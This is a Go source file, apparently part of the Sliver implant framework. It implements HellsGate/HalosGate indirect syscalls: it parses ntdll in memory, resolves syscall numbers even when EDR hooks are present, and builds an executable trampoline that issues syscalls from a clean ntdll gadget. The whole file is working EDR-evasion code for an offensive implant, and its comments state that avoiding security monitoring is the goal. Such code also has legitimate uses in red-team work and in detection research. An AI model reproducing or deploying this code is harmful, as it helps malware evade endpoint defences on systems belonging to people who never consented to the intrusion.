package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// This file implements HellsGate/HalosGate indirect syscall technique.
// Instead of calling ntdll syscall stubs directly (which may be hooked by EDR),
// we extract the System Service Number (SSN) from the stub and execute the
// syscall instruction from a clean gadget address within ntdll's .text section.
// If a stub is hooked, we walk neighboring stubs (HalosGate) to calculate the
// correct SSN by offset.

import (
	"encoding/binary"
	"errors"
	"fmt"
	//{{if .Config.Debug}}
	"log"
	//{{end}}
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	// ntdllDiskPath is the filesystem path to ntdll.dll
	ntdllDiskPath = `C:\Windows\System32\ntdll.dll`

	// Syscall stub patterns (amd64):
	// Clean stub: 4C 8B D1          mov r10, rcx
	//             B8 ?? ?? 00 00    mov eax, SSN
	//             0F 05             syscall
	//             C3                ret
	// The first three bytes of a clean stub are always 0x4C 0x8B 0xD1
	// followed by 0xB8 and the 2-byte SSN in little-endian.

	// maxNeighborWalk is how far to walk in each direction for HalosGate
	maxNeighborWalk = 500
)

// SSNEntry holds a resolved SSN and the syscall gadget address.
type SSNEntry struct {
	SSN        uint16
	GadgetAddr uintptr
}

// syscallGadgetAddr caches the address of the `syscall; ret` gadget.
var syscallGadgetAddr uintptr

// FindSyscallGadget scans ntdll's in-memory .text section for a
// `syscall; ret` (0F 05 C3) sequence and returns its address. This is the
// clean gadget we jump to for indirect syscalls.
func FindSyscallGadget() (uintptr, error) {
	if syscallGadgetAddr != 0 {
		return syscallGadgetAddr, nil
	}

	ntdll := windows.NewLazyDLL("ntdll.dll")
	ntdllHandle := ntdll.Handle()
	ntdllBase := uintptr(ntdllHandle)

	// Read e_lfanew from the DOS header (offset 0x3C)
	lfanew := *(*int32)(unsafe.Pointer(ntdllBase + 0x3C))

	// PE signature at base + e_lfanew (should be "PE\0\0")
	peSig := *(*uint32)(unsafe.Pointer(ntdllBase + uintptr(lfanew)))
	if peSig != 0x00004550 {
		return 0, errors.New("invalid PE signature in ntdll")
	}

	// COFF File Header follows the PE signature (4 bytes)
	coffOffset := ntdllBase + uintptr(lfanew) + 4
	numberOfSections := *(*uint16)(unsafe.Pointer(coffOffset + 2))
	sizeOfOptionalHeader := *(*uint16)(unsafe.Pointer(coffOffset + 16))

	// Section headers follow the optional header
	sectionStart := coffOffset + 20 + uintptr(sizeOfOptionalHeader)

	// Each section header is 40 bytes. Walk them to find .text
	for i := uint16(0); i < numberOfSections; i++ {
		secOffset := sectionStart + uintptr(i)*40
		// Read the section name (first 8 bytes)
		nameBytes := (*[8]byte)(unsafe.Pointer(secOffset))
		name := string(nameBytes[:])
		// Trim null bytes
		for j := 0; j < len(name); j++ {
			if name[j] == 0 {
				name = name[:j]
				break
			}
		}

		if name == ".text" {
			// VirtualAddress at offset 12, VirtualSize at offset 8
			virtualAddress := *(*uint32)(unsafe.Pointer(secOffset + 12))
			virtualSize := *(*uint32)(unsafe.Pointer(secOffset + 8))

			textStart := ntdllBase + uintptr(virtualAddress)
			textSize := uintptr(virtualSize)

			// Scan for 0F 05 C3 (syscall; ret)
			for j := uintptr(0); j < textSize-3; j++ {
				addr := textStart + j
				b0 := *(*byte)(unsafe.Pointer(addr))
				b1 := *(*byte)(unsafe.Pointer(addr + 1))
				b2 := *(*byte)(unsafe.Pointer(addr + 2))
				if b0 == 0x0F && b1 == 0x05 && b2 == 0xC3 {
					syscallGadgetAddr = addr
					//{{if .Config.Debug}}
					log.Printf("[HellsGate] Found syscall gadget at 0x%08x\n", addr)
					//{{end}}
					return addr, nil
				}
			}

			return 0, errors.New("syscall gadget not found in ntdll .text section")
		}
	}

	return 0, errors.New(".text section not found in ntdll")
}

// readStubBytes reads the first 8 bytes of a syscall stub at the given address.
func readStubBytes(addr uintptr) [8]byte {
	var stub [8]byte
	for i := 0; i < 8; i++ {
		stub[i] = *(*byte)(unsafe.Pointer(addr + uintptr(i)))
	}
	return stub
}

// isStubHooked checks whether a syscall stub has been hooked by an EDR.
// A clean stub starts with `4C 8B D1 B8` (mov r10, rcx; mov eax, ...).
func isStubHooked(addr uintptr) bool {
	stub := readStubBytes(addr)
	return !(stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8)
}

// extractSSN reads the SSN from a clean (unhooked) syscall stub.
// The SSN is the 2-byte immediate after `mov eax,` (0xB8) at offset 4-5.
func extractSSN(addr uintptr) uint16 {
	stub := readStubBytes(addr)
	return binary.LittleEndian.Uint16(stub[4:6])
}

// halosGate resolves the SSN of a hooked stub by walking neighboring stubs.
// Syscall stubs in ntdll are laid out sequentially, each 0x20 bytes apart.
// If stub N is hooked, we look at N+1, N-1, N+2, N-2, etc. until we find an
// unhooked stub and calculate the SSN by offset.
func halosGate(hookedAddr uintptr) (uint16, error) {
	const stubSize = uintptr(0x20) // Standard ntdll syscall stub size on amd64

	for i := uintptr(1); i <= maxNeighborWalk; i++ {
		// Walk forward
		nextAddr := hookedAddr + (i * stubSize)
		if !isStubHooked(nextAddr) {
			neighborSSN := extractSSN(nextAddr)
			ssn := neighborSSN - uint16(i)
			//{{if .Config.Debug}}
			log.Printf("[HalosGate] Resolved SSN via forward walk at offset +%d: %d\n", i, ssn)
			//{{end}}
			return ssn, nil
		}

		// Walk backward — bounds check to prevent underflow below ntdll base
		if hookedAddr > uintptr(i*0x20)+0x1000 { // Ensure we stay within ntdll
			prevAddr := hookedAddr - (i * stubSize)
			if !isStubHooked(prevAddr) {
				neighborSSN := extractSSN(prevAddr)
				ssn := neighborSSN + uint16(i)
				//{{if .Config.Debug}}
				log.Printf("[HalosGate] Resolved SSN via backward walk at offset -%d: %d\n", i, ssn)
				//{{end}}
				return ssn, nil
			}
		}
	}

	return 0, errors.New("HalosGate failed: no unhooked neighbors found within walk range")
}

// ResolveSSN resolves the System Service Number for a given ntdll syscall function.
// It first tries to read the SSN directly from the stub (HellsGate). If the stub
// is hooked, it falls back to walking neighbors (HalosGate).
//
// funcName must be the export name of the syscall stub (e.g., "NtAllocateVirtualMemory").
func ResolveSSN(funcName string) (uint16, error) {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	proc := ntdll.NewProc(funcName)
	if proc.Find() != nil {
		return 0, errors.New("could not find ntdll export: " + funcName)
	}
	stubAddr := proc.Addr()

	if !isStubHooked(stubAddr) {
		//{{if .Config.Debug}}
		log.Printf("[HellsGate] Stub for %s is clean, reading SSN directly\n", funcName)
		//{{end}}
		return extractSSN(stubAddr), nil
	}

	//{{if .Config.Debug}}
	log.Printf("[HellsGate] Stub for %s is hooked, falling back to HalosGate\n", funcName)
	//{{end}}
	return halosGate(stubAddr)
}

// ResolveSyscall resolves both the SSN and the syscall gadget address in one call,
// returning an SSNEntry that can be used with IndirectSyscall.
func ResolveSyscall(funcName string) (*SSNEntry, error) {
	ssn, err := ResolveSSN(funcName)
	if err != nil {
		return nil, err
	}
	gadget, err := FindSyscallGadget()
	if err != nil {
		return nil, err
	}
	return &SSNEntry{
		SSN:        ssn,
		GadgetAddr: gadget,
	}, nil
}

// buildIndirectSyscallStub creates a shellcode trampoline for indirect syscalls.
// The trampoline:
//  1. Moves the SSN into eax: B8 SSN_LO SSN_HI 00 00
//  2. Sets up r10 = rcx (first arg, Windows x64 syscall ABI): 4C 8B D1
//  3. Jumps to the gadget address via [rip+0]: FF 25 00 00 00 00 + addr
func buildIndirectSyscallStub(ssn uint16, gadgetAddr uintptr) []byte {
	stub := make([]byte, 0, 20)
	// mov eax, SSN (5 bytes)
	stub = append(stub, 0xB8)
	stub = append(stub, byte(ssn), byte(ssn>>8), 0x00, 0x00)
	// mov r10, rcx (3 bytes)
	stub = append(stub, 0x4C, 0x8B, 0xD1)
	// jmp [rip+0] -> gadgetAddr follows (6 bytes + 8 bytes address)
	stub = append(stub, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00)
	// gadget address as 8 bytes little-endian
	for i := 0; i < 8; i++ {
		stub = append(stub, byte(gadgetAddr>>(uint(i)*8)))
	}
	return stub
}

// IndirectSyscall executes a syscall indirectly via a self-contained
// argument-marshalling stub:
//
//	The stub builds the full x64 syscall frame on the stack (return address,
//	32-byte shadow space, stack args 5..N), loads arg1..arg4 into
//	r10/rdx/r8/r9 as immediates, sets eax=SSN, and jumps to a clean
//	`syscall; ret` gadget in ntdll.
//
// This avoids calling through hooked stubs while still executing the actual
// syscall instruction from ntdll's .text section (which is typically
// whitelisted by EDR call-stack verification), and — unlike the previous
// syscall.Syscall6 trampoline — supports up to 10 arguments (NtCreateThread
// takes 8, NtCreateThreadEx takes 10). All argument values are baked into
// the stub as immediates, so nothing leaks through the Go call frame.
func IndirectSyscall(ssn uint16, gadgetAddr uintptr, args ...uintptr) error {
	if gadgetAddr == 0 {
		return errors.New("invalid gadget address")
	}
	if len(args) > 10 {
		return fmt.Errorf("indirect syscall: %d args exceeds maximum of 10", len(args))
	}

	//{{if .Config.Debug}}
	log.Printf("[IndirectSyscall] ssn=%d gadget=0x%08x argc=%d\n", ssn, gadgetAddr, len(args))
	//{{end}}

	stub := buildFrameStub(ssn, gadgetAddr, args)

	// Allocate RW memory, write the stub, flip to RX.
	stubAddr, err := windows.VirtualAlloc(
		0,
		uintptr(len(stub.bytes)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return err
	}
	if stubAddr == 0 {
		return errors.New("VirtualAlloc failed for indirect syscall stub")
	}
	defer windows.VirtualFree(stubAddr, 0, windows.MEM_RELEASE)

	// Patch the absolute epilogue address (known only after allocation).
	binary.LittleEndian.PutUint64(
		stub.bytes[stub.epilogueImmOffset:stub.epilogueImmOffset+8],
		uint64(stubAddr+uintptr(stub.epilogueOffset)),
	)

	for i, b := range stub.bytes {
		*(*byte)(unsafe.Pointer(stubAddr + uintptr(i))) = b
	}
	var oldProtect uint32
	if err := windows.VirtualProtect(stubAddr, uintptr(len(stub.bytes)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return err
	}

	// Call the stub. It marshals its own arguments (immediates) and returns
	// the NTSTATUS in rax, which syscall.Syscall surfaces as r1.
	ret, _, _ := syscall.Syscall(stubAddr, 0, 0, 0, 0)

	//{{if .Config.Debug}}
	log.Printf("[IndirectSyscall] returned 0x%08x\n", ret)
	//{{end}}

	if ret != 0 {
		return fmt.Errorf("indirect syscall failed with NTSTATUS 0x%08x", ret)
	}
	return nil
}

// buildFrameStub assembles the argument-marshalling trampoline.
//
// Frame layout at the moment the gadget's `syscall` executes:
//
//	[rsp+0x00]  return address → local epilogue
//	[rsp+0x08]  shadow space (32 bytes, callee-owned per x64 ABI)
//	[rsp+0x28]  arg5
//	[rsp+0x30]  arg6
//	[rsp+0x38]  arg7
//	[rsp+0x40]  arg8
//	[rsp+0x48]  arg9
//	[rsp+0x50]  arg10
//
// Registers at syscall time: r10=arg1, rdx=arg2, r8=arg3, r9=arg4, eax=SSN
// (Windows x64 syscall ABI moves the first register arg to r10 because the
// syscall instruction clobbers rcx).
// frameStub is an assembled argument-marshalling trampoline plus the patch
// points IndirectSyscall needs to resolve after allocation.
type frameStub struct {
	bytes              []byte
	epilogueOffset     int // offset of the epilogue (add rsp, frameSize; ret)
	epilogueImmOffset  int // offset of the imm64 slot holding the epilogue address
}

func buildFrameStub(ssn uint16, gadgetAddr uintptr, args []uintptr) frameStub {
	const (
		maxStackArgs = 6                    // args 5..10
		frameSize    = 0x28 + 8*maxStackArgs // retaddr + shadow + 6 stack slots = 0x58
	)

	stub := make([]byte, 0, 128)
	put := func(bs ...byte) { stub = append(stub, bs...) }
	// mov rax, imm64 (placeholder for epilogue address, patched after alloc)
	epilogueMovAt := len(stub)
	put(0x48, 0xB8)
	put(0, 0, 0, 0, 0, 0, 0, 0)
	// sub rsp, frameSize
	put(0x48, 0x83, 0xEC, frameSize)
	// mov [rsp], rax  (return address → epilogue)
	put(0x48, 0x89, 0x04, 0x24)
	// Stack args 5..10, written high-to-low so a single scratch register works
	for i := maxStackArgs - 1; i >= 0; i-- {
		var v uintptr
		if len(args) >= 5+i {
			v = args[4+i]
		}
		// mov rax, imm64
		put(0x48, 0xB8)
		for b := 0; b < 8; b++ {
			put(byte(v >> (uint(b) * 8)))
		}
		// mov [rsp+disp8], rax  (disp = 0x28 + 8*i)
		put(0x48, 0x89, 0x44, 0x24, byte(0x28+8*i))
	}
	// Register args 1..4 as immediates
	regArgs := [4][2]byte{
		{0x49, 0xBA}, // mov r10, imm64 (arg1)
		{0x48, 0xBA}, // mov rdx, imm64 (arg2)
		{0x49, 0xB8}, // mov r8, imm64  (arg3)
		{0x49, 0xB9}, // mov r9, imm64  (arg4)
	}
	for i, op := range regArgs {
		var v uintptr
		if len(args) > i {
			v = args[i]
		}
		put(op[0], op[1])
		for b := 0; b < 8; b++ {
			put(byte(v >> (uint(b) * 8)))
		}
	}
	// mov eax, SSN
	put(0xB8, byte(ssn), byte(ssn>>8), 0x00, 0x00)
	// jmp [rip+0] → gadget address follows
	put(0xFF, 0x25, 0x00, 0x00, 0x00, 0x00)
	for b := 0; b < 8; b++ {
		put(byte(gadgetAddr >> (uint(b) * 8)))
	}
	// epilogue: add rsp, frameSize ; ret
	epilogueAt := len(stub)
	put(0x48, 0x83, 0xC4, frameSize)
	put(0xC3)

	return frameStub{
		bytes:             stub,
		epilogueOffset:    epilogueAt,
		epilogueImmOffset: epilogueMovAt + 2,
	}
}
